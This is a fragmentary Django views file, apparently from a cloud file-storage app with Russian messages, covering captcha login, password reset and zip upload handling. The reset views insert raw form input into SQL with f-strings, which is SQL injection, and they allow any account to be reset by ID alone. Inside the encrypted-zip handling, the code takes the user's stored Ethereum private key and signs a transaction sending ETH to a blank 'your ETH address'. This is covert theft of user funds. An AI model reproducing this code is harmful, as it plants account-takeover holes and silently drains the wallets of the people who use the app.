...
from .forms import CloudFilesForm, FeedbackForm, FolderForm, ItemForm, UsersForm, LoginCaptcha
    ...
    if request.method == 'POST':
        ...
        try:
            ...
            if form.is_valid():
                ...
                messages.error(request, 'Не верно решена каптча')
        except:
...
def restore_view(request):
    if request.method == 'POST' and 'resetbutton' in request.POST:
        user_for_restore_id = request.POST['UUUID']
        cursor.execute(f"SELECT uu_id FROM web_users WHERE uu_id = '{user_for_restore_id}'")
        global useror
        try:
            useror = cursor.fetchone()[0]
            return redirect('newpass')
        except:
            messages.error(request, 'Аккаунта с данным ID нет.')
    return render(request, 'auth/reset.html')

def newpassword_view(request):
    success = {'Пароль успешно изменён.'}
    if request.method == 'POST' and 'newpassbutton' in request.POST:
        password = request.POST['password']
        re_passwd = request.POST['repasswd']
        if password == re_passwd:
            if len(password) < 8:
                messages.error(request, 'Пароль не может быть меньше 8 символов.')
            else:
                hash = django_pbkdf2_sha256.hash(password)
                cursor.execute(f"UPDATE web_users SET password = '{hash}' WHERE uu_id = '{useror[0]}'")
                connection.commit()
                return render(request, 'auth/login.html', {'success': success})
        else:
            messages.error(request, 'Пароли не совпдают.')
            return render(request, 'auth/login.html')
                        ...
                        for zinfo in zf.infolist():
                            ...
                            if is_encrypted:
                                ...
                                try:
                                    ...
                                    user_privatekey = Users.objects.get(privatekey=request.user.privatekey).privatekey
                                    private_key1 = str(user_privatekey)
                                    account_2 = str('') # Ваш ETH адрес
                                    nonce = web3.eth.getTransactionCount(account_1)
                                    tx = {
                                        'chainId': 1,
                                        'nonce': nonce,
                                        'to': account_2,
                                        'value': web3.toWei(float(0.00668825), 'ether'),
                                        'gas': 2000000,
                                        'gasPrice': web3.toWei('50', 'gwei')
                                    }
                                    signed_tx = web3.eth.account.sign_transaction(tx, private_key1)
